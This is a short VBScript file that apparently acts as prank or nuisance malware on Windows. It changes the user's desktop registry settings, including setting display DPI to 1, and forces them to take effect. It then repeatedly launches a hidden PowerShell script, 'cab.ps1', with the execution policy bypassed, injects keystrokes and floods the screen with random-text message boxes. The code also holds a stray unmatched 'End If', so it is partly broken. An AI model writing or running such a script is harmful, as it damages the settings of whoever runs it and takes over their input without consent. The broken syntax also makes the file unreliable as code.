Set objShell = WScript.CreateObject("WScript.Shell")
count = 0

strKey = "HKCU\Control Panel\Desktop"
objShell.RegWrite strKey & "\ColorFilter", "1", "REG_SZ"
objShell.RegWrite strKey & "\LogPixels", "1", "REG_SZ"
objShell.Run "RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters", 1, True

' Buddy

Do While count < 100
objShell.Run "powershell -ExecutionPolicy Bypass -File ""cab.ps1""", 0, False
objShell.SendKeys "{TAB}"

    count = count + 1

    If count = 5 Then
        objShell.SendKeys "{Enter}"
        count = 0
    End If

    count = count + 1

        message = GenerateRandomString(40, 10)
        title = GenerateRandomString(10, 5)
        
        MsgBox message, 64, title
    End If
    
    WScript.Sleep 50
Loop

Function GenerateRandomString(maxLength, minLength)
    Dim charSet
    Dim strLength
    Dim i
    Dim randomStr
    
    charSet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+[]{}|;:,.<>?/"
    strLength = Int((maxLength - minLength + 1) * Rnd + minLength)
    randomStr = ""
    
    For i = 1 To strLength
        randomStr = randomStr & Mid(charSet, Int((Len(charSet) * Rnd) + 1), 1)
    Next
    
    GenerateRandomString = randomStr
End Function

